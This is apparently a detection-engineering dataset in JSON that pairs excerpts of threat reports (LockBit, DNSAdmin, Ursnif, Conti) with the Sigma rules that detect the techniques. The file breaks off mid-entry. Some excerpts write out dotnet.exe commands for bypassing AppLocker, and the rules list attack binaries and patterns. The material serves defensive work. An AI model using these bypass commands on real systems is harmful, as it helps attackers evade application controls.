    "markdown": "# LockBit Ransomware Side-loads Cobalt Strike Beacon with Legitimate VMware Utility ## Executive Summary - The VMware command line utility `VMwareXferlogs.exe` used for data transfer to and from VMX logs is susceptible to DLL side-loading. - During a recent investigation, our DFIR team discovered that LockBit Ransomware-as-a-Service (RaaS) side-loads Cobalt Strike Beacon through a signed VMware xfer logs command line utility. - The threat actor uses PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a `.log` file containing an encrypted Cobalt Strike Reflective Loader. - The malicious DLL evades defenses by removing EDR/EPP’s userland",
    "sigma_rule": {
      "title": "DLL Sideloading by VMware Xfer Utility",
      "id": "ebea773c-a8f1-42ad-a856-00cb221966e8",
      "status": "test",
      "description": "Detects execution of VMware Xfer utility (VMwareXferlogs.exe) from the non-default directory which may be an attempt to sideload arbitrary DLL",
      "references": [
        "https://www.sentinelone.com/labs/lockbit-ransomware-side-loads-cobalt-strike-beacon-with-legitimate-vmware-utility/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-02",
      "tags": [
        "attack.defense-evasion",
        "attack.t1574.002"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\VMwareXferlogs.exe"
        },
        "filter": {
          "Image|startswith": "C:\\Program Files\\VMware\\"
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_dll_sideload_vmware_xfer.yml"
  },
  "148": {
    "url": "https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83",
    "markdown": "# Feature, not bug: DNSAdmin to DC compromise in one line **May 8, 2017** --- ## Background In addition to implementing their own DNS server, Microsoft has also implemented their own management protocol for that server, to allow for easy management and integration with Active Directory domains. By default, domain controllers are also DNS servers; DNS servers need to be reachable and usable by mostly every domain user. This, in turn, exposes quite some attack surface on domain controllers — on one part, the DNS protocol itself and on the other, the management protocol, which is based on RPC. We",
    "sigma_rule": {
      "title": "New DNS ServerLevelPluginDll Installed Via Dnscmd.EXE",
      "id": "f63b56ee-3f79-4b8a-97fb-5c48007e8573",
      "related": [
        {
          "id": "e61e8a88-59a9-451c-874e-70fcc9740d67",
          "type": "derived"
        },
        {
          "id": "cbe51394-cd93-4473-b555-edf0144952d9",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the installation of a DNS plugin DLL via ServerLevelPluginDll parameter in registry, which can be used to execute code in context of the DNS server (restart required)",
      "references": [
        "https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83",
        "https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2017-05-08",
      "modified": "2023-02-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1574.002",
        "attack.t1112"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\dnscmd.exe",
          "CommandLine|contains|all": [
            "/config",
            "/serverlevelplugindll"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_dnscmd_install_new_server_level_plugin_dll.yml"
  },
  "149": {
    "url": "https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html",
    "markdown": "# Hunting DNS Server Level Plugin dll injection 09 May 2017 This post is accompanying my addition to the ThreatHunter-Playbook to enhance the IOC I added there with some details to detect the DNS server level plugin dll injection, published this week. I am not going to make a detailed description for that attack, as there are already plenty of great resources: - Feature, not bug: DNSAdmin to DC compromise in one line. - Abusing DNSAdmins privilege for escalation in Active Directory If you want to play with this DNS server feature just use one of the following DNS Server",
    "sigma_rule": {
      "title": "New DNS ServerLevelPluginDll Installed Via Dnscmd.EXE",
      "id": "f63b56ee-3f79-4b8a-97fb-5c48007e8573",
      "related": [
        {
          "id": "e61e8a88-59a9-451c-874e-70fcc9740d67",
          "type": "derived"
        },
        {
          "id": "cbe51394-cd93-4473-b555-edf0144952d9",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the installation of a DNS plugin DLL via ServerLevelPluginDll parameter in registry, which can be used to execute code in context of the DNS server (restart required)",
      "references": [
        "https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83",
        "https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2017-05-08",
      "modified": "2023-02-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1574.002",
        "attack.t1112"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\dnscmd.exe",
          "CommandLine|contains|all": [
            "/config",
            "/serverlevelplugindll"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_dnscmd_install_new_server_level_plugin_dll.yml"
  },
  "150": {
    "url": "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dotnet/",
    "markdown": "# /Dotnet.exe dotnet.exe comes with .NET Framework ### Paths: - `C:\\Program Files\\dotnet\\dotnet.exe` ### Resources: - https://twitter.com/_felamos/status/1204705548668555264 - https://gist.github.com/bohops/3f645a7238d8022830ecf5511b3ecfbc - https://bohops.com/2019/08/19/dotnet-core-a-vector-for-awl-bypass-defense-evasion/ - https://learn.microsoft.com/en-us/dotnet/fsharp/tools/fsharp-interactive/ ### Detections: - **Sigma**: proc_creation_win_lolbin_dotnet.yml - **BlockRule**: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules - **IOC**: dotnet.exe spawned an unknown process ## AWL bypass 1. dotnet.exe will execute any dll even if applocker is enabled. ``` dotnet.exe [PATH_TO_DLL] ``` **Properties**: - **Use case**: Execute code bypassing AWL - **Privileges required**: User - **Operating systems**: Windows 7 and up with .NET installed - **ATT&CK® technique**: T1218: System Binary Proxy Execution 2. dotnet.exe with msbuild (SDK Version) will execute unsigned code ``` dotnet.exe msbuild [Path_TO_XML_CSPROJ] ```",
    "sigma_rule": {
      "title": "Arbitrary DLL or Csproj Code Execution Via Dotnet.EXE",
      "id": "d80d5c81-04ba-45b4-84e4-92eba40e0ad3",
      "status": "test",
      "description": "Detects execution of arbitrary DLLs or unsigned code via a \".csproj\" files via Dotnet.EXE.",
      "references": [
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dotnet/",
        "https://web.archive.org/web/20210525212021/https://twitter.com/_felamos/status/1204705548668555264",
        "https://bohops.com/2019/08/19/dotnet-core-a-vector-for-awl-bypass-defense-evasion/"
      ],
      "author": "Beyu Denis, oscd.community",
      "date": "2020-10-18",
      "modified": "2024-04-24",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\dotnet.exe"
          },
          {
            "OriginalFileName": ".NET Host"
          }
        ],
        "selection_cli": {
          "CommandLine|endswith": [
            ".csproj",
            ".csproj\"",
            ".dll",
            ".dll\"",
            ".csproj'",
            ".dll'"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate administrator usage"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_dotnet_arbitrary_dll_csproj_execution.yml"
  },
  "151": {
    "url": "https://web.archive.org/web/20210525212021/https://twitter.com/_felamos/status/1204705548668555264",
    "markdown": "# Post Dec 11, 2019 dotnet.exe [PATH_TO_DLL] Its just like doing python http://script.py . (funny) dotnet.exe is trusted binary and Default AppLocker rule don't block it so its a valid AppLocker bypass. Similar to regasm.exe. CC @egre55 #lolbin",
    "sigma_rule": {
      "title": "Arbitrary DLL or Csproj Code Execution Via Dotnet.EXE",
      "id": "d80d5c81-04ba-45b4-84e4-92eba40e0ad3",
      "status": "test",
      "description": "Detects execution of arbitrary DLLs or unsigned code via a \".csproj\" files via Dotnet.EXE.",
      "references": [
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dotnet/",
        "https://web.archive.org/web/20210525212021/https://twitter.com/_felamos/status/1204705548668555264",
        "https://bohops.com/2019/08/19/dotnet-core-a-vector-for-awl-bypass-defense-evasion/"
      ],
      "author": "Beyu Denis, oscd.community",
      "date": "2020-10-18",
      "modified": "2024-04-24",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\dotnet.exe"
          },
          {
            "OriginalFileName": ".NET Host"
          }
        ],
        "selection_cli": {
          "CommandLine|endswith": [
            ".csproj",
            ".csproj\"",
            ".dll",
            ".dll\"",
            ".csproj'",
            ".dll'"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate administrator usage"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_dotnet_arbitrary_dll_csproj_execution.yml"
  },
  "152": {
    "url": "https://bohops.com/2019/08/19/dotnet-core-a-vector-for-awl-bypass-defense-evasion/",
    "markdown": "# DotNet Core: A Vector For AWL Bypass & Defense Evasion **Posted on** August 19, 2019 (Updated on December 15, 2022) ## Introduction .NET Core is an open-source, cross-platform framework for building and running applications. The framework was introduced in 2014 as the (eventual) successor to the ever-popular .NET Framework. .NET Core runs on Windows, *Nix, and MacOS operating systems. The .NET Core management tool, DotNet (dotnet.exe), potentially offers an untapped attack surface on Windows when leveraged with the Software Development Kit (SDK). In this introductory post, we’ll briefly highlight a few areas of interest that include: - A basic",
    "sigma_rule": {
      "title": "Arbitrary DLL or Csproj Code Execution Via Dotnet.EXE",
      "id": "d80d5c81-04ba-45b4-84e4-92eba40e0ad3",
      "status": "test",
      "description": "Detects execution of arbitrary DLLs or unsigned code via a \".csproj\" files via Dotnet.EXE.",
      "references": [
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dotnet/",
        "https://web.archive.org/web/20210525212021/https://twitter.com/_felamos/status/1204705548668555264",
        "https://bohops.com/2019/08/19/dotnet-core-a-vector-for-awl-bypass-defense-evasion/"
      ],
      "author": "Beyu Denis, oscd.community",
      "date": "2020-10-18",
      "modified": "2024-04-24",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\dotnet.exe"
          },
          {
            "OriginalFileName": ".NET Host"
          }
        ],
        "selection_cli": {
          "CommandLine|endswith": [
            ".csproj",
            ".csproj\"",
            ".dll",
            ".dll\"",
            ".csproj'",
            ".dll'"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate administrator usage"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_dotnet_arbitrary_dll_csproj_execution.yml"
  },
  "153": {
    "url": "https://thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/",
    "markdown": "# Unwrapping Ursnifs Gifts **Categories:** cobaltstrike Exfiltrate Data ursnif wmiexec **Published on:** January 9, 2023 In late August 2022, we investigated an incident involving Ursnif malware, which resulted in Cobalt Strike being deployed. This was followed by the threat actors moving laterally throughout the environment using an admin account. The Ursnif malware family (also commonly referred to as Gozi or ISFB) is one of the oldest banking trojans still active today. It has an extensive past of code forks and evolutions that has led to several active variants in the last 5 years including Dreambot, IAP, RM2, RM3, and most",
    "sigma_rule": {
      "title": "Potential Recon Activity Using DriverQuery.EXE",
      "id": "9fc3072c-dc8f-4bf7-b231-18950000fadd",
      "related": [
        {
          "id": "a20def93-0709-4eae-9bd2-31206e21e6b2",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detect usage of the \"driverquery\" utility to perform reconnaissance on installed drivers",
      "references": [
        "https://thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/",
        "https://www.vmray.com/cyber-security-blog/analyzing-ursnif-behavior-malware-sandbox/",
        "https://www.fireeye.com/blog/threat-research/2020/01/saigon-mysterious-ursnif-fork.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-19",
      "modified": "2023-09-29",
      "tags": [
        "attack.discovery"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "driverquery.exe"
          },
          {
            "OriginalFileName": "drvqry.exe"
          }
        ],
        "selection_parent": [
          {
            "ParentImage|endswith": [
              "\\cscript.exe",
              "\\mshta.exe",
              "\\regsvr32.exe",
              "\\rundll32.exe",
              "\\wscript.exe"
            ]
          },
          {
            "ParentImage|contains": [
              "\\AppData\\Local\\",
              "\\Users\\Public\\",
              "\\Windows\\Temp\\"
            ]
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate usage by some scripts might trigger this as well"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_driverquery_recon.yml"
  },
  "154": {
    "url": "https://www.vmray.com/cyber-security-blog/analyzing-ursnif-behavior-malware-sandbox/",
    "markdown": "# Analyzing Ursnif’s Behavior Using a Malware Sandbox Home > VMRay Cybersecurity Blog **Date:** 06/25/2019 ## Ursnif Overview Ursnif is a group of malware families based on the same leaked source code. When fully executed, Ursnif has the capability to steal banking and online account credentials. In this blog post, we will analyze the payload of a Ursnif sample and demonstrate how a malware sandbox can expedite the investigation process. Ursnif (also known as Gozi) is a banking Trojan that generally collects system activity, records keystroke data, and keeps track of network and browser activity. Access the VMRay Analyzer Report",
    "sigma_rule": {
      "title": "Potential Recon Activity Using DriverQuery.EXE",
      "id": "9fc3072c-dc8f-4bf7-b231-18950000fadd",
      "related": [
        {
          "id": "a20def93-0709-4eae-9bd2-31206e21e6b2",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detect usage of the \"driverquery\" utility to perform reconnaissance on installed drivers",
      "references": [
        "https://thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/",
        "https://www.vmray.com/cyber-security-blog/analyzing-ursnif-behavior-malware-sandbox/",
        "https://www.fireeye.com/blog/threat-research/2020/01/saigon-mysterious-ursnif-fork.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-19",
      "modified": "2023-09-29",
      "tags": [
        "attack.discovery"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "driverquery.exe"
          },
          {
            "OriginalFileName": "drvqry.exe"
          }
        ],
        "selection_parent": [
          {
            "ParentImage|endswith": [
              "\\cscript.exe",
              "\\mshta.exe",
              "\\regsvr32.exe",
              "\\rundll32.exe",
              "\\wscript.exe"
            ]
          },
          {
            "ParentImage|contains": [
              "\\AppData\\Local\\",
              "\\Users\\Public\\",
              "\\Windows\\Temp\\"
            ]
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate usage by some scripts might trigger this as well"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_driverquery_recon.yml"
  },
  "155": {
    "url": "https://www.fireeye.com/blog/threat-research/2020/01/saigon-mysterious-ursnif-fork.html",
    "markdown": "# SAIGON, the Mysterious Ursnif Fork **January 9, 2020** --- Ursnif (aka Gozi/Gozi-ISFB) is one of the oldest banking malware families still in active distribution. While the first major version of Ursnif was identified in 2006, several subsequent versions have been released in large part due to source code leaks. FireEye reported on a previously unidentified variant of the Ursnif malware family to our threat intelligence subscribers in September 2019 after identification of a server that hosted a collection of tools, which included multiple point-of-sale malware families. This malware self-identified as \"SaiGon version 3.50 rev 132,\" and our analysis suggests",
    "sigma_rule": {
      "title": "Potential Recon Activity Using DriverQuery.EXE",
      "id": "9fc3072c-dc8f-4bf7-b231-18950000fadd",
      "related": [
        {
          "id": "a20def93-0709-4eae-9bd2-31206e21e6b2",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detect usage of the \"driverquery\" utility to perform reconnaissance on installed drivers",
      "references": [
        "https://thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/",
        "https://www.vmray.com/cyber-security-blog/analyzing-ursnif-behavior-malware-sandbox/",
        "https://www.fireeye.com/blog/threat-research/2020/01/saigon-mysterious-ursnif-fork.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-19",
      "modified": "2023-09-29",
      "tags": [
        "attack.discovery"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "driverquery.exe"
          },
          {
            "OriginalFileName": "drvqry.exe"
          }
        ],
        "selection_parent": [
          {
            "ParentImage|endswith": [
              "\\cscript.exe",
              "\\mshta.exe",
              "\\regsvr32.exe",
              "\\rundll32.exe",
              "\\wscript.exe"
            ]
          },
          {
            "ParentImage|contains": [
              "\\AppData\\Local\\",
              "\\Users\\Public\\",
              "\\Windows\\Temp\\"
            ]
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate usage by some scripts might trigger this as well"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_driverquery_recon.yml"
  },
  "156": {
    "url": "https://thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/",
    "markdown": "# Unwrapping Ursnifs Gifts **Categories:** cobaltstrike Exfiltrate Data ursnif wmiexec **Published on:** January 9, 2023 In late August 2022, we investigated an incident involving Ursnif malware, which resulted in Cobalt Strike being deployed. This was followed by the threat actors moving laterally throughout the environment using an admin account. The Ursnif malware family (also commonly referred to as Gozi or ISFB) is one of the oldest banking trojans still active today. It has an extensive past of code forks and evolutions that has led to several active variants in the last 5 years including Dreambot, IAP, RM2, RM3, and most",
    "sigma_rule": {
      "title": "DriverQuery.EXE Execution",
      "id": "a20def93-0709-4eae-9bd2-31206e21e6b2",
      "related": [
        {
          "id": "9fc3072c-dc8f-4bf7-b231-18950000fadd",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detect usage of the \"driverquery\" utility. Which can be used to perform reconnaissance on installed drivers",
      "references": [
        "https://thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/",
        "https://www.vmray.com/cyber-security-blog/analyzing-ursnif-behavior-malware-sandbox/",
        "https://www.fireeye.com/blog/threat-research/2020/01/saigon-mysterious-ursnif-fork.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-19",
      "modified": "2023-09-29",
      "tags": [
        "attack.discovery"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": "driverquery.exe"
          },
          {
            "OriginalFileName": "drvqry.exe"
          }
        ],
        "filter_main_other": [
          {
            "ParentImage|endswith": [
              "\\cscript.exe",
              "\\mshta.exe",
              "\\regsvr32.exe",
              "\\rundll32.exe",
              "\\wscript.exe"
            ]
          },
          {
            "ParentImage|contains": [
              "\\AppData\\Local\\",
              "\\Users\\Public\\",
              "\\Windows\\Temp\\"
            ]
          }
        ],
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Legitimate use by third party tools in order to investigate installed drivers"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_driverquery_usage.yml"
  },
  "157": {
    "url": "https://www.vmray.com/cyber-security-blog/analyzing-ursnif-behavior-malware-sandbox/",
    "markdown": "# Analyzing Ursnif’s Behavior Using a Malware Sandbox Home > VMRay Cybersecurity Blog **Date:** 06/25/2019 ## Ursnif Overview Ursnif is a group of malware families based on the same leaked source code. When fully executed, Ursnif has the capability to steal banking and online account credentials. In this blog post, we will analyze the payload of a Ursnif sample and demonstrate how a malware sandbox can expedite the investigation process. Ursnif (also known as Gozi) is a banking Trojan that generally collects system activity, records keystroke data, and keeps track of network and browser activity. Access the VMRay Analyzer Report",
    "sigma_rule": {
      "title": "DriverQuery.EXE Execution",
      "id": "a20def93-0709-4eae-9bd2-31206e21e6b2",
      "related": [
        {
          "id": "9fc3072c-dc8f-4bf7-b231-18950000fadd",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detect usage of the \"driverquery\" utility. Which can be used to perform reconnaissance on installed drivers",
      "references": [
        "https://thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/",
        "https://www.vmray.com/cyber-security-blog/analyzing-ursnif-behavior-malware-sandbox/",
        "https://www.fireeye.com/blog/threat-research/2020/01/saigon-mysterious-ursnif-fork.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-19",
      "modified": "2023-09-29",
      "tags": [
        "attack.discovery"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": "driverquery.exe"
          },
          {
            "OriginalFileName": "drvqry.exe"
          }
        ],
        "filter_main_other": [
          {
            "ParentImage|endswith": [
              "\\cscript.exe",
              "\\mshta.exe",
              "\\regsvr32.exe",
              "\\rundll32.exe",
              "\\wscript.exe"
            ]
          },
          {
            "ParentImage|contains": [
              "\\AppData\\Local\\",
              "\\Users\\Public\\",
              "\\Windows\\Temp\\"
            ]
          }
        ],
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Legitimate use by third party tools in order to investigate installed drivers"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_driverquery_usage.yml"
  },
  "158": {
    "url": "https://www.fireeye.com/blog/threat-research/2020/01/saigon-mysterious-ursnif-fork.html",
    "markdown": "# SAIGON, the Mysterious Ursnif Fork **January 9, 2020** --- Ursnif (aka Gozi/Gozi-ISFB) is one of the oldest banking malware families still in active distribution. While the first major version of Ursnif was identified in 2006, several subsequent versions have been released in large part due to source code leaks. FireEye reported on a previously unidentified variant of the Ursnif malware family to our threat intelligence subscribers in September 2019 after identification of a server that hosted a collection of tools, which included multiple point-of-sale malware families. This malware self-identified as \"SaiGon version 3.50 rev 132,\" and our analysis suggests",
    "sigma_rule": {
      "title": "DriverQuery.EXE Execution",
      "id": "a20def93-0709-4eae-9bd2-31206e21e6b2",
      "related": [
        {
          "id": "9fc3072c-dc8f-4bf7-b231-18950000fadd",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detect usage of the \"driverquery\" utility. Which can be used to perform reconnaissance on installed drivers",
      "references": [
        "https://thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/",
        "https://www.vmray.com/cyber-security-blog/analyzing-ursnif-behavior-malware-sandbox/",
        "https://www.fireeye.com/blog/threat-research/2020/01/saigon-mysterious-ursnif-fork.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-19",
      "modified": "2023-09-29",
      "tags": [
        "attack.discovery"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": "driverquery.exe"
          },
          {
            "OriginalFileName": "drvqry.exe"
          }
        ],
        "filter_main_other": [
          {
            "ParentImage|endswith": [
              "\\cscript.exe",
              "\\mshta.exe",
              "\\regsvr32.exe",
              "\\rundll32.exe",
              "\\wscript.exe"
            ]
          },
          {
            "ParentImage|contains": [
              "\\AppData\\Local\\",
              "\\Users\\Public\\",
              "\\Windows\\Temp\\"
            ]
          }
        ],
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Legitimate use by third party tools in order to investigate installed drivers"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_driverquery_usage.yml"
  },
  "159": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1482/T1482.md",
    "markdown": "# T1482 - Domain Trust Discovery ## Description from ATT&CK > Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain. [(Citation: Microsoft Trusts)] Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct SID-History Injection, Pass the Ticket, and Kerberoasting. [(Citation: AdSecurity Forging Trust Tickets)] [(Citation: Harmj0y Domain Trusts)] Domain trusts",
    "sigma_rule": {
      "title": "Domain Trust Discovery Via Dsquery",
      "id": "3bad990e-4848-4a78-9530-b427d854aac0",
      "related": [
        {
          "id": "b23fcb74-b1cb-4ff7-a31d-bfe2a7ba453b",
          "type": "similar"
        },
        {
          "id": "77815820-246c-47b8-9741-e0def3f57308",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"dsquery.exe\" for domain trust discovery",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1482/T1482.md",
        "https://posts.specterops.io/an-introduction-to-manual-active-directory-querying-with-dsquery-and-ldapsearch-84943c13d7eb?gi=41b97a644843"
      ],
      "author": "E.M. Anhaus, Tony Lambert, oscd.community, omkar72",
      "date": "2019-10-24",
      "modified": "2023-02-02",
      "tags": [
        "attack.discovery",
        "attack.t1482"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\dsquery.exe"
          },
          {
            "OriginalFileName": "dsquery.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "trustedDomain"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate use of the utilities by legitimate user for legitimate reason"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_dsquery_domain_trust_discovery.yml"
  },
  "160": {
    "url": "https://posts.specterops.io/an-introduction-to-manual-active-directory-querying-with-dsquery-and-ldapsearch-84943c13d7eb?gi=41b97a644843",
    "markdown": "# An Introduction to Manual Active Directory Querying with Dsquery and Ldapsearch Let’s be honest, BloodHound and PowerView are objectively better tools for querying, enumerating, and investigating Active Directory (AD). They are more efficient, intuitive and with BloodHound you can track queries easily. It is also worth noting before we dive in, using the `-v` flag in PowerView will show you the query that is being run and can save a bit of time. However, you may one day find yourself in a situation, as I did in a recent assessment, where those tools are not readily available or viable.",
    "sigma_rule": {
      "title": "Domain Trust Discovery Via Dsquery",
      "id": "3bad990e-4848-4a78-9530-b427d854aac0",
      "related": [
        {
          "id": "b23fcb74-b1cb-4ff7-a31d-bfe2a7ba453b",
          "type": "similar"
        },
        {
          "id": "77815820-246c-47b8-9741-e0def3f57308",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"dsquery.exe\" for domain trust discovery",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1482/T1482.md",
        "https://posts.specterops.io/an-introduction-to-manual-active-directory-querying-with-dsquery-and-ldapsearch-84943c13d7eb?gi=41b97a644843"
      ],
      "author": "E.M. Anhaus, Tony Lambert, oscd.community, omkar72",
      "date": "2019-10-24",
      "modified": "2023-02-02",
      "tags": [
        "attack.discovery",
        "attack.t1482"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\dsquery.exe"
          },
          {
            "OriginalFileName": "dsquery.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "trustedDomain"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate use of the utilities by legitimate user for legitimate reason"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_dsquery_domain_trust_discovery.yml"
  },
  "161": {
    "url": "https://twitter.com/vxunderground/status/1423336151860002816",
    "markdown": "# Post Aug 5, 2021 A \"pentester\" for Conti has leaked \"pentester manuals and software\" online. These files are allegedly given to affiliates vxug.fakedoma[.]in/tmp/ - Link modified, Twitters banned our domains - Some files password protected, we do not know the password - Images from XSS ```image Alt: Image 1 Description: The image displays a group of screenshots that seem to be part of a communication or discussion regarding penetration testing related to the Conti ransomware group. The screenshots include dialogues and messages that refer to connections to specific servers, password prompts, and operational details associated with the Conti group.",
    "sigma_rule": {
      "title": "Esentutl Gather Credentials",
      "id": "7df1713a-1a5b-4a4b-a071-dc83b144a101",
      "status": "test",
      "description": "Conti recommendation to its affiliates to use esentutl to access NTDS dumped file. Trickbot also uses this utilities to get MSEdge info via its module pwgrab.",
      "references": [
        "https://twitter.com/vxunderground/status/1423336151860002816",
        "https://attack.mitre.org/software/S0404/",
        "https://thedfirreport.com/2021/08/01/bazarcall-to-conti-ransomware-via-trickbot-and-cobalt-strike/"
      ],
      "author": "sam0x90",
      "date": "2021-08-06",
      "modified": "2022-10-09",
      "tags": [
        "attack.credential-access",
        "attack.t1003",
        "attack.t1003.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
